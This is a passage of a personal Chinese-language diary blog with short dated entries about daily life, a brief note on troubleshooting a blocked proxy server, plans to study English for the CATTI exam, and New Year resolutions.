18:30一个人在公司楼下吃了个晚饭。食堂比外卖好吃多了。\n- 19:00坐公交车遇到一个凶凶的司机。\n- 20:30男票带我一起研究了一下我俩突然无法翻墙的服务器，如下图所示。原因是GFW把我们服务器发回的ACK响应包给截了。哈哈哈有用的知识又增加了！\n\n![](evil-gfw.png)\n\n## 0919\n\n突发奇想，想要捡起从初中开始就很喜欢但从高中毕业就没好好学过的英语。曲曲折折绕了一圈又一圈，最终还是会回到心中的原点。一个人一辈子只做一件事，并且能一直做好，也是一件很了不起的事情啊。\n\n给自己定个小目标吧，明年把CATTI二级考过，扎实一下翻译功底。加油加油！\n\n## 1117\n\n时间过得可真快。一天天都干了啥呢。\n\n# 2021\n\n## 0217\n\n春节假期结束了，得打起精神上班了。\n\n一个月、两个月，日子总是过得这么快，一不留神今年就快过去六分之一了。\n\n许多想记录下来得话，无奈语文水平就这样，表达能力有限，那就少说多做吧！把握好每一天！等到年底回顾这一年的时候，不要再让自己觉得虚度了时光。\n\n今年争取少熬夜，多早起，保持充足的睡眠少打哈欠(^_^)","categories":["Life"]}]